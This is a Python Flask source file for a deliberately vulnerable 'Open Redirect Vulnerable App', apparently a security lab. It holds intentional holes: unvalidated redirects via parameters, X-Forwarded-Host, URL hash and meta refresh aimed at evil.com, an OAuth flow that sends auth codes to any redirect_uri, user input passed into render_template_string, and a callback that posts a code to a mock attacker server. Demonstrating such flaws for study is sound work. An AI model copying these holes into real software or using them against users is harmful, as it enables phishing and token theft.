from flask import Flask, request, redirect, render_template_string
import uuid
import requests

app = Flask(__name__)

# Temporary storage for state and code to simulate OAuth process
tokens = {}

@app.route("/")
def home():
    return """
    <h2>🚀 Open Redirect Vulnerable App</h2>
    <ul>
        <li><a href="/header_redirect?next=https://evil.com">Header-Based Redirect</a></li>
        <li><a href="/host_redirect"> Header-Based Redirect (x-forward)</a></li> 
        <li><a href="/js_redirect#https://evil.com">JavaScript-Based Redirect</a></li>
        <li><a href="/meta_redirect?next=https://evil.com">Meta Refresh Redirect</a></li>
        <li><a href="/parameter_redirect?url=https://evil.com">Parameter-Based Redirect</a></li>
        <li><a href="/oauth_login?redirect_uri=http://localhost:8081/auth/oauthCallback">OAuth Redirect</a></li>
    </ul>
    """

@app.route("/header_redirect")
def header_redirect():
    next_page = request.args.get("next")
    return redirect(next_page) if next_page else "No redirect specified."

@app.route("/host_redirect")
def host_redirect():
    host = request.headers.get("X-Forwarded-Host", "example.com")
    return redirect(f"https://{host}/dashboard")

@app.route("/js_redirect")
def js_redirect():
    return """
    <script>
        if (window.location.hash) {
            var hash = window.location.hash.substring(1);
            window.location.href = hash;
        }
    </script>
    <h2>🔄 JavaScript Redirect Example</h2>
    <p>Add a hash to the URL like <code>/js_redirect#https://evil.com</code></p>
    """

@app.route("/meta_redirect")
def meta_redirect():
    next_page = request.args.get("next", "#")
    html_template = f"""
    <html>
    <head>
        <meta http-equiv="refresh" content="3;url={next_page}">
    </head>
    <body>
        <h2>🔄 Meta Refresh Redirect Example</h2>
        <p>Redirecting in 3 seconds...</p>
    </body>
    </html>
    """
    return html_template

@app.route("/parameter_redirect")
def parameter_redirect():
    url = request.args.get("url", "/")
    return redirect(url)

@app.route('/login', methods=['GET'])
def login():
    state = request.args.get('state', str(uuid.uuid4()))
    redirect_uri = request.args.get('redirect_uri', '')

    # Generate an authentication code
    auth_code = str(uuid.uuid4())
    tokens[state] = auth_code

    # Redirect user to redirect_uri (which can be an attacker's server)
    return redirect(f"{redirect_uri}?state={state}&code={auth_code}", code=302)

@app.route("/oauth_login")
def oauth_login():
    """Simulate an OAuth login page"""
    redirect_uri = request.args.get("redirect_uri", "http://localhost:8081/auth/oauthCallback")

    login_form = f"""
    <html>
    <body>
        <h2>🔐 Fake OAuth Login</h2>
        <p>Simulating OAuth login page...</p>
        <form action="/auth/oauthCallback" method="POST">
            <input type="hidden" name="redirect_uri" value="{redirect_uri}">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """
    return render_template_string(login_form)

@app.route("/auth/oauthCallback", methods=["POST"])
def oauth_callback():
    """Simulate OAuth callback (sending token to attacker's server)"""
    redirect_uri = "http://localhost:8081/auth/oauthCallback"
    
    state = request.form.get("state", str(uuid.uuid4()))
    code = str(uuid.uuid4())  # Generate a fake authentication code

    # Send data to attacker's server (localhost:8081)
    try:
        requests.get(f"{redirect_uri}?state={state}&code={code}")
    except requests.exceptions.RequestException:
        pass  # Ignore errors if attacker's server is unreachable

    return "✅ OAuth token sent to attacker server!", 200

if __name__ == "__main__":
    app.run(port=5000, debug=True)
